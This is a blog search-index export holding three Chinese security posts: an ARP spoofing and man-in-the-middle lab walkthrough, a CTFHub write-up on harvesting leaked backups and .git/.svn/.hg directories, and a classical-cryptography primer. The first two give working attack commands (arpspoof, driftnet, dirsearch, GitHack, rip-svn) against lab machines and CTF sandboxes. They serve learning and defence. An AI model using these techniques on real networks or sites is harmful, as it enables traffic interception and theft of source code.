<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ARP欺骗</title>
    <url>/2021/02/08/arp-spoof/</url>
    <content><![CDATA[<h2 id="ARP欺骗原理"><a href="#ARP欺骗原理" class="headerlink" title="ARP欺骗原理"></a>ARP欺骗原理</h2><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>ARP(Address Resolution Protocol地址解析协议)，是根据网络地址(即IP地址)获取物理地址(即MAC地址)的协议<a id="more"></a></p>
<h3 id="ARP通信过程"><a href="#ARP通信过程" class="headerlink" title="ARP通信过程"></a>ARP通信过程</h3><p>主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
<h3 id="ARP协议缺陷"><a href="#ARP协议缺陷" class="headerlink" title="ARP协议缺陷"></a>ARP协议缺陷</h3><p>地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存。</p>
<h3 id="ARP欺骗原理-1"><a href="#ARP欺骗原理-1" class="headerlink" title="ARP欺骗原理"></a>ARP欺骗原理</h3><p>根据上面所说的协议缺陷，我们可以向某主机发送自己伪造的网关的ARP响应包，把其中的MAC地址改为自己的MAC地址，这样该主机本应向网关发送的流量就会发送到自己的电脑上，如果本机没开IP转发功能的话相当于ARP断网攻击，如果开了IP转发功能且同时欺骗了被攻击主机和网关则相当于ARP中间人攻击。中间人攻击可以查看被攻击主机的所有流量，也可以用driftnet来查看被攻击主机所查看的图片。</p>
<h3 id="ARP欺骗实操"><a href="#ARP欺骗实操" class="headerlink" title="ARP欺骗实操"></a>ARP欺骗实操</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>攻击主机A:Kali2020 ip：10.0.0.27</p>
<p>被攻击主机B:win10 ip：10.0.0.26</p>
<p>网关C的ip：10.0.0.1</p>
<p>物理机中ipconfig：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208160336292.png" alt="image-20210208160336292"></p>
<p>虚拟机kali中ifconfig：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208164446405.png" alt="image-20210208164446405"></p>
<p>探测局域网中的主机fping -g 10.0.0.1/24：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208161117727.png" alt="image-20210208161117727"></p>
<p>首先进行ARP断网攻击，所以要IP转发功能，Linux因为系统安全，默认不支持IP转发，其配置文件在/proc/sys/net/ipv4/ip_forward   默认0为关，修改1为开</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208161558117.png" alt="image-20210208161558117"></p>
<p>攻击前先查看物理机arp缓存表并且检查是否联网：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208161727678.png" alt="image-20210208161727678"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208162630515.png" alt="image-20210208162630515"></p>
<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>开始攻击：kali中arpspoof -i eth0 -t 10.0.0.26 10.0.0.1。其中-i表示interface(网络接口)即为网卡,-t后面加需要攻击的主机IP和网关IP。执行命令，Kali会不停地向主机B发送ARP响应包，响应包的内容是Kali的mac地址，而响应包里的ip则是网关主机ip地址。每一行代表一个响应包。从左到右：自己Kali的mac、主机B的mac、帧类型码(0806，代表ARP包)、包大小、包内容。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208161852549.png" alt="img"></p>
<p>攻击后再在物理中查看arp缓存表：   可以看到网关的mac地址已经被改为了kali的mac地址，arp断网攻击成功</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208162148549.png" alt="image-20210208162148549"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208164647800.png" alt="image-20210208164647800"></p>
<p>可以看到ping不通了，断网了。</p>
<p>ARP中间人攻击：</p>
<p>1.打开kali的IP转发功能(echo 1 &gt; /proc/sys/net/ipv4/ip_forward)</p>
<p>2.arpspoof -i eth0 -t 10.0.0.26 -r 10.0.0.1</p>
<blockquote>
<p>-i interface 指定要使用的接口（即指定一块网卡）</p>
<p>-t target  指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。</p>
<p>-r用来毒化两个主机（目标和网关（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</p>
</blockquote>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208170128118.png" alt="image-20210208170128118"></p>
<p>3.攻击成功后，可以抓包来看流量，另外可以用driftnet来查看被攻击主机所浏览的图片</p>
<p>driftnet -i eth0:</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208165824829.png" alt="image-20210208165824829"></p>
<p>但是我一直获取不到图片，不知道哪里出了问题，若有大佬知道，恳求联系我并告知原因</p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="物理机ping不通虚拟机"><a href="#物理机ping不通虚拟机" class="headerlink" title="物理机ping不通虚拟机"></a>物理机ping不通虚拟机</h3><p>经过google之后，发现重启vm8的网卡即可</p>
<h3 id="桥接模式不显示IP-虚拟机ping不通物理机"><a href="#桥接模式不显示IP-虚拟机ping不通物理机" class="headerlink" title="桥接模式不显示IP,虚拟机ping不通物理机"></a>桥接模式不显示IP,虚拟机ping不通物理机</h3><p>虚拟机的网络适配器选择桥接模式，然后在打开虚拟网络编辑器，点击更改设置，然后将自动改为个人局域网，然后应用，然后再改回自动，应用确定之后即可。并且每次启动虚拟机都要这样设置，感觉很玄学</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208172207172.png" alt="image-20210208172207172"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208170715495.png" alt="image-20210208170715495"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208170758475.png" alt="image-20210208170758475"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210208172329443.png" alt="image-20210208172329443"></p>
<h2 id="ARP欺骗防御"><a href="#ARP欺骗防御" class="headerlink" title="ARP欺骗防御"></a>ARP欺骗防御</h2><p>防御原理很简单，就是不让攻击者肆意表明自己就是网关主机。我们进入网关主机（路由器后台地址），网络参数一栏一般有ip与mac绑定一栏，把网关的mac地址与网关地址绑定就好了。只要确定了对应关系，当攻击者发布arp相应包时，就不会更新相应的ip-mac缓存表。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209222549513.png" alt="image-20210209222549513"></p>
<p>如果想知道对方主机的ip地址其实也容易。我们在Cmd下键入命令<code>arp -a</code>看一下相同mac，就找到了攻击者。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>公共区域的wifi存在钓鱼风险</p>
<p>在传输数据过程中尽量使用加密程序</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>CTFHUB信息泄露</title>
    <url>/2021/03/23/ctfhub-Information-disclosure/</url>
    <content><![CDATA[<h2 id="0x00目录遍历"><a href="#0x00目录遍历" class="headerlink" title="0x00目录遍历"></a>0x00目录遍历</h2><p>这题比较简单，目录一个个翻过去就能找到flag<a id="more"></a></p>
<h2 id="0x01PHPINFO"><a href="#0x01PHPINFO" class="headerlink" title="0x01PHPINFO"></a>0x01PHPINFO</h2><blockquote>
<p><code>phpinfo()</code> 是php中查看相关信息的函数，当在页面中执行<code>phpinfo()</code>函数时，php会将自身的所有信息全部打印出来。在phpinfo中会泄露很多服务端的一些信息.例如安装的一些模块、网站绝对路径、服务器自身的操作系统、使用的组件版本等等，在phpinfo中获得的这些信息会为下一步的渗透/做题提供一些帮助</p>
</blockquote>
<p>打开题目，直接ctrl+f搜索ctfhub</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210322213030561.png" alt="image-20210322213030561"></p>
<h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><blockquote>
<p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
</blockquote>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323081920199.png" alt="image-20210323081920199"></p>
<p>1.dirsearch扫描</p>
<p><code>python3 dirsearch.py -u http://challenge-cf9faace3a6f6f4f.sandbox.ctfhub.com:10080/ -e *</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323082219705.png" alt="image-20210323082219705"></p>
<p>可以看到有一个<a href="http://www.zip备份文件，访问并下载" target="_blank" rel="noopener">www.zip备份文件，访问并下载</a></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323082504903.png" alt="image-20210323082504903"></p>
<p>注意，下载文件里没有flag，需要访问线上环境，也就是<a href="http://challenge-cf9faace3a6f6f4f.sandbox.ctfhub.com:10080/flag_884925986.txt" target="_blank" rel="noopener">http://challenge-cf9faace3a6f6f4f.sandbox.ctfhub.com:10080/flag_884925986.txt</a>  得到flag</p>
<p>2.写python脚本</p>
<p>参考CSDN上某位师傅的脚本</p>
<figure class="highlight plain"><figcaption><span>requests</span></figcaption><table><tr><td class="code"><pre><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;challenge-d43c376975fe79c9.sandbox.ctfhub.com:10080&#x2F;&quot;</span><br><span class="line">a &#x3D; [&#39;web&#39;,&#39;website&#39;,&#39;backup&#39;,&#39;back&#39;,&#39;www&#39;,&#39;wwwroot&#39;,&#39;temp&#39;]</span><br><span class="line">b &#x3D; [&#39;tar&#39;,&#39;tar.gz&#39;,&#39;zip&#39;,&#39;rar&#39;]</span><br><span class="line"></span><br><span class="line">for i in a:</span><br><span class="line">	for j in b:</span><br><span class="line">		pos &#x3D; url + i + &#39;.&#39; + j</span><br><span class="line">		r &#x3D; requests.get(pos)</span><br><span class="line">		print(i)</span><br><span class="line">		print(j)</span><br><span class="line">		print(r)</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「这里是青」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;a597934448&#x2F;article&#x2F;details&#x2F;105431367</span><br></pre></td></tr></table></figure>

<h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><blockquote>
<p>考点：bak文件泄露</p>
<p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码</p>
</blockquote>
<p>1.直接访问<a href="http://challenge-690f816819d034d4.sandbox.ctfhub.com:10080/index.php.bak下载打开得到flag" target="_blank" rel="noopener">http://challenge-690f816819d034d4.sandbox.ctfhub.com:10080/index.php.bak下载打开得到flag</a></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323083630723.png" alt="image-20210323083630723"></p>
<p>2.dirsearch扫描</p>
<p>找不到文件，就扫一下看看</p>
<p>3.curl访问</p>
<p>命令行里<code>curl http://challenge-690f816819d034d4.sandbox.ctfhub.com:10080/index.php.bak</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323083933053.png" alt="image-20210323083933053"></p>
<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><blockquote>
<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
<p>考点：vim交换文件名</p>
<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 index.php 为例：第一次产生的交换文件名为 <code>.index.php.swp</code></p>
<p>再次意外退出后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
<p>第三次产生的交换文件则为 <code>.index.php.swn</code></p>
</blockquote>
<p>注意：index前面有’.’</p>
<p>1.curl访问</p>
<p>但是不知道为什么我curl不能直接查看，需要用–output -1.txt来导出文件</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323084800873.png" alt="image-20210323084800873"></p>
<p>2.直接访问.index.php.swp文件下载查看</p>
<p><a href="http://challenge-24655e45a7e82dcd.sandbox.ctfhub.com:10080/.index.php.swp" target="_blank" rel="noopener">http://challenge-24655e45a7e82dcd.sandbox.ctfhub.com:10080/.index.php.swp</a></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323084941771.png" alt="image-20210323084941771"></p>
<p>看了官方wp，除了用编辑器查看外，可以用vim编辑原有文件，例如下载的<code>.index.php.swp</code>，则说明之前编辑的文件名为<code>index.php</code></p>
<p><code>vim index.php</code>会提示是否恢复，选择R恢复查看原始内容，具体内容可以看官方wp<a href="https://writeup.ctfhub.com/Skill/Web/信息泄露/备份文件下载/qRLpeHeAKJtXs9uV68pmjv.html" target="_blank" rel="noopener">https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/qRLpeHeAKJtXs9uV68pmjv.html</a></p>
<h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><blockquote>
<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
</blockquote>
<p>1.直接访问下载</p>
<p><a href="http://challenge-698e43df72eaa635.sandbox.ctfhub.com:10080/.DS_Store" target="_blank" rel="noopener">http://challenge-698e43df72eaa635.sandbox.ctfhub.com:10080/.DS_Store</a></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323085943221.png" alt="image-20210323085943221"></p>
<p>不知道为什么这里有空格隔开了，自行把空格去掉然后访问</p>
<p>2.curl</p>
<p>3.利用工具解析</p>
<p>官方wp中写到可以用Python-dsstore来解析.DS_Store文件<a href="https://writeup.ctfhub.com/Skill/Web/信息泄露/备份文件下载/R95hfDpwDbP2gQ6uEhj3x.html" target="_blank" rel="noopener">https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/R95hfDpwDbP2gQ6uEhj3x.html</a></p>
<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><blockquote>
<p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
</blockquote>
<p>扫描发现git目录有内容</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323092056411.png" alt="image-20210323092056411"></p>
<p>然后用Githack工具clone目标源代码到本地</p>
<p><code>python GitHack.py http://challenge-bb79305d79fd9c62.sandbox.ctfhub.com:10080/.git/</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323133647117.png" alt="image-20210323133647117"></p>
<p>执行git log查看历史记录</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323133738535.png" alt="image-20210323133738535"></p>
<p>可以看到当前版本为remove flag，而flag在add flag的提交记录里。</p>
<p>解法一：通过与add flag对比</p>
<p><code>git diff 330e</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323134023453.png" alt="image-20210323134023453"></p>
<p>解法二：切换到add flag这个版本</p>
<p><code>git reset --hard 330e</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323134213626.png" alt="image-20210323134213626"></p>
<p>得到一个txt文件，打开获得flag</p>
<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><blockquote>
<p>考点：git 泄露 <code>.git/refs/stash</code></p>
<p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p>
</blockquote>
<p>用Githack工具把源代码clone到本地</p>
<p><code>python GitHack http://challenge-62efc1b2c479abdf.sandbox.ctfhub.com:10080/.git/</code></p>
<p>git stash list: 显示Git栈内的所有备份，可以利用这个列表来决定从那个地方恢复。</p>
<p>git stash pop: 从Git栈中读取最近一次保存的内容，恢复工作区的相关内容。由于可能存在多个Stash的内容，所以用栈来管理，pop会从最近的一个stash中读取内容并恢复。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323135315081.png" alt="image-20210323135315081"></p>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>直接Githack下载到本地就有flag</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323135819169.png" alt="image-20210323135819169"></p>
<h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><blockquote>
<p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
</blockquote>
<p>这里贴一个漏洞库<a href="https://vulwiki.readthedocs.io/zh_CN/latest/web/svn/" target="_blank" rel="noopener">https://vulwiki.readthedocs.io/zh_CN/latest/web/svn/</a></p>
<p>利用dvcs-ripper工具里的rip-svn.pl脚本进行clone.我在本地跑脚本报错，所以就在kali里测试</p>
<p><code>./rip-svn.pl -u http://challenge-cf93aa0fbd9e2635.sandbox.ctfhub.com:10080/.svn/</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323160142906.png" alt="image-20210323160142906"></p>
<p><code>cat wc.db | grep -a flag</code></p>
<p>有个flag文件，尝试访问了一下，并没有得到flag</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323160444530.png" alt="image-20210323160444530"></p>
<p>去pristine文件夹看看，成功找到flag</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323160717397.png" alt="image-20210323160717397"></p>
<h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><blockquote>
<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
</blockquote>
<p>还是用dvcs-ripper下载源代码</p>
<p><code>./rip-hg.pl -v -u http://challenge-151201cbebbbeb85.sandbox.ctfhub.com:10080/.hg/</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323161442938.png" alt="image-20210323161442938"></p>
<p>查看.hg/store/fncache或者直接<code>grep -r flag *</code>找到flag文件，访问得到flag</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210323161756847.png" alt="image-20210323161756847"></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://blog.csdn.net/a597934448/article/details/105431367" target="_blank" rel="noopener">https://blog.csdn.net/a597934448/article/details/105431367</a></p>
<p><a href="https://writeup.ctfhub.com/categories/Skill/Web/信息泄露/" target="_blank" rel="noopener">https://writeup.ctfhub.com/categories/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1682519" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1682519</a></p>
<p><a href="https://www.jianshu.com/p/ea88b6a22fcb" target="_blank" rel="noopener">https://www.jianshu.com/p/ea88b6a22fcb</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>Crypto—之古典密码学入门</title>
    <url>/2021/02/09/calssical-crypto/</url>
    <content><![CDATA[<h2 id="Crypto之古典密码学"><a href="#Crypto之古典密码学" class="headerlink" title="Crypto之古典密码学"></a>Crypto之古典密码学</h2><h3 id="什么是密码学"><a href="#什么是密码学" class="headerlink" title="什么是密码学"></a>什么是密码学</h3><blockquote>
<p>密码学是一个多面的世界，对一些人来说，它是一个侦探与保密的世界，对另一些人来说，它是数学与计算机的世界。<a id="more"></a>无论你如何看待它，密码学都是神秘而富有冒险色彩的。它还超越了传统的学术学科。它不只是计算机科学的内容，密码学的研究包括历史、政治学、工程、语言军事学、伦理、数学和工业技术学等。<br>——《经典密码学与现代密码学》</p>
</blockquote>
<p>古典密码学主要关注信息的保密书写和传递，以及与其相对应的破译方法。<br>现代密码学不只关注信息保密问题，还同时涉及信息完整性验证、信息发布的不可抵赖性、以及在分布式计算中产生的来源于内部和外部的攻击的所有信息安全问题。</p>
<p>CTF 中的古典密码学题目有时也会出现在杂项里面，古典加密常常不给出加密算法，需要判断或者尝试一下。<br>而 CTF 中的现代加密常常会给出加密算法，或者以一些形式提示某种常用的加密算法。即通过公开的加密算法和题目给的条件来思考解密的算法并加以实现。</p>
<p>在有关密码学的一些描述中，常使用Alice和Bob作为两个想要传递消息的两个人，Eve是想要从传递的密文中窃取明文信息的人。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209120459595.png" alt="image-20210209120459595"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209120955560.png" alt="image-20210209120955560"></p>
<h3 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h3><p>凯撒加密（Caesar cipher）是一种最简单且最广为人知的加密技术，它属于替代加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209121100813.png" alt="image-20210209121100813"></p>
<p>凯撒加密会生成一个一一对应的密码表，加密和解密过程都是通过查表完成的。<br>和很多其他的单表替换加密一样，凯撒加密是十分不安全的。可以把移位值看作密钥key，不难想到，在明文空间为26个英文字母时，有效的密钥只有25个。所以很容易枚举出来。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209121257633.png" alt="image-20210209121257633"></p>
<h3 id="关键词加密"><a href="#关键词加密" class="headerlink" title="关键词加密"></a>关键词加密</h3><p>关键词加密（keyword cipher）也是一种单表替代加密，与凯撒加密不同之处在于密钥可以更为复杂，加密时需要选择一个关键词，如果这个关键词有重复的字母，去除第一次出现之外的所有的相同的字母。例如，如果选定的关键词为“success”，则使用“suce”。<br>将该关键词写在字母表的下方，并用字母表的其他字母按标准的顺序填写余下的空间。这样就构建了字母一一对应的关系，加密时用下面一行中的字母对应替换上面一行的字母；解密时用上面一行中的字母对应替换下面一行的字母。</p>
<p>ACTF2020 Crypto Keysar</p>
<p>Cipher : agqr{yue_stdcgciup_padas}<br>Key : angstromcf</p>
<p>前10个字母先用key填充，后面的按字母表顺序展开。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209122033770.png" alt="image-20210209122033770"></p>
<table>
<thead>
<tr>
<th><strong>a</strong></th>
<th><strong>g</strong></th>
<th><strong>q</strong></th>
<th><strong>r</strong></th>
<th><strong>{</strong></th>
<th><strong>y</strong></th>
<th><strong>u</strong></th>
<th><strong>e</strong></th>
<th><strong>_</strong></th>
<th><strong>s</strong></th>
<th><strong>t</strong></th>
<th><strong>d</strong></th>
<th><strong>c</strong></th>
<th><strong>g</strong></th>
<th><strong>c</strong></th>
<th><strong>i</strong></th>
<th><strong>u</strong></th>
<th><strong>p</strong></th>
<th><strong>_</strong></th>
<th><strong>p</strong></th>
<th><strong>a</strong></th>
<th><strong>d</strong></th>
<th><strong>a</strong></th>
<th><strong>s</strong></th>
<th><strong>}</strong></th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>c</td>
<td>t</td>
<td>f</td>
<td>{</td>
<td>y</td>
<td>u</td>
<td>m</td>
<td>_</td>
<td>d</td>
<td>e</td>
<td>l</td>
<td>i</td>
<td>c</td>
<td>i</td>
<td>o</td>
<td>u</td>
<td>s</td>
<td>_</td>
<td>s</td>
<td>a</td>
<td>l</td>
<td>a</td>
<td>d</td>
<td>}</td>
</tr>
</tbody></table>
<p>按照上面的表格，对应解密得到flag：actf{yum_delicious_salad}</p>
<h3 id="仿射加密"><a href="#仿射加密" class="headerlink" title="仿射加密"></a>仿射加密</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209122154303.png" alt="image-20210209122154303"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209122558041.png" alt="image-20210209122558041"></p>
<p>解密时需要计算（或枚举）密钥数字对中 a 的逆元，也就是 a 对 26 的模反数。<br>模反数可以简单理解为整数环中的倒数，a 乘以 a 的模反数对 26 取模等于 1。例如 5 对 26 的逆元就是 21。<br>所以一个数乘以 a，再乘以 a 的逆元，就能算回原来的数。</p>
<p>求逆元可以用 Python 的第三方包 gmpy2 的 invert 函数：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209122647392.png" alt="image-20210209122647392"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209122910508.png" alt="image-20210209122910508"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209122915509.png" alt="image-20210209122915509"></p>
<p>这里a的-1指的是a的逆元</p>
<p>举个例子：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209134020025.png" alt="image-20210209134020025"></p>
<p>其中<img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209134034113.png" alt="image-20210209134034113"></p>
<p>所以尽管套了三层，还是可以当作普通的仿射加密进行破解。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209134104885.png" alt="image-20210209134104885"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209134135454.png" alt="image-20210209134135454"></p>
<h3 id="单表替代密码分析"><a href="#单表替代密码分析" class="headerlink" title="单表替代密码分析"></a>单表替代密码分析</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209134530393.png" alt="image-20210209134530393"></p>
<p>所以枚举的方式获取字母间的对应关系显然是难以承受的。</p>
<p>可以利用不同的英文字母在文段中的出现频率特征，来帮助我们判断某个字母被替换成了某个字母的可能性。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209134550283.png" alt="image-20210209134550283"></p>
<p>词频分析不仅针对单个字母的出现频率，同时有很多连续的两个字母出现频率较高（双联字母 bigrams），也可以辅助我们进行分析。<br>以下是平均在1000个单词中，各双联字母出现的次数：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209134749931.png" alt="image-20210209134749931"></p>
<p>另外，如果有一个较大的单词库，还可以通过单词的格式，进一步帮助我们缩小可能的范围，例如单词happy，为12334格式，success为1233411格式，那么被进行单表替换后，它的格式并不会发生改变。<br>这种模式匹配的优点在于即使密文长度较短，也能尽可能找到接近真相的结果。<br><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p>
<h3 id="维吉尼亚加密"><a href="#维吉尼亚加密" class="headerlink" title="维吉尼亚加密"></a>维吉尼亚加密</h3><p>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码。为了生成密码，需要使用表格法。这一表格包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行加密是基于密钥进行的，在过程中会不断地变换。</p>
<p>加密<br>明文：ATTACKATDAWN<br>选择关键词：LEMON，重复关键词，直到长度和明文相同，作为密钥：LEMONLEMONLE<br>通过等长的明文和密钥，依次查表得到密文：LXFOPVEFRNHR</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209135355450.png" alt="image-20210209135355450"></p>
<p>解密<br>解密的过程则与加密相反。例如：根据密钥第一个字母 L 所对应的 L 行字母表，发现密文第一个字母 L 位于 A 列，因而明文第一个字母为 A 。密钥第二个字母 E 对应 E 行字母表，而密文第二个字母 X 位于此行 T 列，因而明文第二个字母为 T。以此类推便可得到明文。</p>
<p>维吉尼亚加密可以避免直接的词频分析攻击，密文在统计上没有明显的规律，但是仍然有方法可以对其进行破解。<br>首先提出破解方法的 Frederick Kasiski 是基于这样一个简单的观察<strong>“密钥的重复部分与明文中的重复部分的连接，在密文中也产生一个重复部分”</strong>。<br>如果一个字符串在明文中重复，并且被密钥相同的部分加密，那么在密文中也会出现重复的字符串。</p>
<p>举个例子：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209140739793.png" alt="image-20210209140739793"></p>
<p>关键词 “RUN” 的长度为 3，密文串“KIOV”的间距是 9，密文串 “NU”的间距是 6，这些间距都是关键词长度的倍数，这样重复足够多次，可以帮助我们判断关键词的长度。</p>
<p>一旦确定了关键词的长度，余下的问题就只是如何使用该信息去找到真正的关键词了。关键词的长度揭示了密文可以被如何破解成单码加密的一个集合。<br>关键词的长度为n，那么破解维吉尼亚加密的问题就变成了解决n个单表加密的问题，需要有足够长的密文，然后通过词频分析逐个解决问题。</p>
